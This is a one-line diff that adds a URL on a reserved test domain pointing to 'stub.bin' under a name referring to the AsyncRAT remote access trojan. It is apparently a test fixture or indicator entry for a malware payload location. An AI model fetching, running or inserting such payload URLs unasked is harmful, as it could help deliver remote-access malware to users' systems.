@@ -1,0 +1,1 @@
+http://asyncrat-2.example.test/stub.bin
